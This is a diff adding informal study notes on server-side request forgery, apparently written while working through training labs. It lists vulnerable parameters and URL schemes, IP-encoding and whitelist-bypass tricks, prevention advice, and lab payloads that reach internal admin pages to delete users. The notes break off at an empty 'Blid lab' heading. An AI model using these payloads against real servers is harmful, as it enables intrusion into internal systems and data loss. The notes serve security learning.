@@ -1,0 +1,147 @@
+SSRF:
+
+  Attacker can take over the server and misuse it for other attacks.
+
+Type OF SSRF:
+
+  Regular/In Band 
+  Blind/Out-of-Band
+
+10th position in web security projects
+
+Black-Box Testing:
+ 
+  Map the application
+  Identify any request parameter that contain hastname,IP address or Full URLS
+  For each request parameter,modify its value to specify an alternative resource and observe how the application responsds
+   .If a defence is in place,attempt to circumvent it using know techniques.
+  For each request parameter,modify its value to a server on the internet that you control and monitor the server for incomeing requests
+    .If  no incoming connections are received,moditor the time taken for application to respond
+
+ White-Box Testing:
+ 
+ ->Review source code and identify all request Parameters that accept URLs
+     ->This could be done by combining both a black-box and white-box testing perspective
+ ->Determine what URL parser is being used and if it can be bypassed. Similarly determnine what additional defences are put in place that can be bypassed.
+ imapct:
+   
+ ->server tackover
+ ->misuse it for attacks
+ ->shoutdown or steal datas
+ 
+ 
+how to find the vulnerable points:
+
+ if server fetcing data from another domain:
+  
+ www.target.com?url=https://attacker.com
+ www.example.com?page=/images 
+ www.example.com?file=https://sub.target.com/image
+ www.example.com?path=
+
+Exploitable params:
+
+ url=
+ uri=
+ file=
+ path=
+ u=
+ page=
+ fetch=
+ link=
+ js=
+ cb=
+ source=
+ sourceurl=
+ 
+protocols:
+file://
+dict://
+sftp://
+ldan://
+tftp://
+gopher://
+ftp://
+sftp://
+ldap://
+tftp://
+nntp://
+
+for more: New era of SSRF -URL parser is programming languages,Cracking the lens: targeting HTTP's hidden attack-surface
+
+ Expolit the vulnerability
+
+   port scanning and internal facing sites should be pointed out.
+
+   if the application does not allow for arbitray user-supplied URLS,try to bypass defenses using the follow techniques.
+
+   Use different encodeing schemaes:
+         
+        ->ip address to decimalconverter tools
+        ->decimal-encoded version of 127.0.0.1 is 2130706433
+        ->127.1 resolves to 127.0.0.1
+        ->Octal representation of 127.0.0.1 is 017700000001
+   ->Register a domain name that resolves to internal IP address(DNS Rebinding)
+   ->Use your own server that redirects to an iternal IP address(HTTP Redirection)
+
+   www.target.com?url=https://localhost:80/
+   www.example.com?page=http://localhost/admin
+   www.example.com?file=https://sub.target.com/image
+   www.example.com?path=
+
+ Exploiting Blind/Out-of-band SSRF
+
+  ->Attempt to trigger an HTTP request to an external system you control and monitor the system for network interaction from the vulnerable server
+   -->Use below methods to bypass if it has any defence mechanism
+  
+Preventing SSRF Vulnerabilities:
+
+  Defense in depth approach:
+      ->Application Layer defenses
+
+         *Sanitize and validate all client-supplied input data
+         *Enforce the URL schema,port,and destination with a positive allow list(white listing)
+         *Do not send raw responses to clients
+         *Disable HTTP redirections
+       
+         Note:Do not mitigate SSRF vulnearabilities using deny lists  or regular expressions.
+
+      ->Network Layer Defenses:
+        
+         *Segment remote resource access functionality in separte networks to reduce the impact of SSRF 
+     
+lab 1:
+
+  http://localhost:80/admin/delete?username=wiener
+lab 2:
+  Basic SSRF against another back-end system
+
+ stockApi=http://192.168.0.4:8080/ -->fuzz this local ip and got -->404 page
+ http://192.168.0.57:8080/ -->try  http://192.168.0.57:8080/admin -->got admin page delet the user
+
+lab3 :
+  Black list based 
+ 
+  for by pass use:http://127.1/ 
+  then try to get admin panel : http://127.1/admin/ -> got forbiden --it using a black list of strings and it use URL encoding
+  so encode the 'admin' string useing burp -->convertsection -->url 
+  
+Lab4 :
+  ssrf via open redirect:
+  
+  open redirect in product list:
+       GET /product/nextProduct?currentProductId=2&path=https://www.google.com
+
+  opeen redirect to ssrf:
+       /product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin
+
+       stockApi=http://localhost#@stock.weliketoshop.net --> defense sys need welipketoshop.net in ulr --> so use # for url paser that make after # contents are invalid / encode # 2 times
+   so the payload is: stockApi=http://localhost%2523@stock.weliketoshop.net
+
+             http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
+                       |                    |                |
+                       url          element in application   path of file
+        so weliketoshop.net white list is bypassed and pwn 
+
+Blid lab:
+
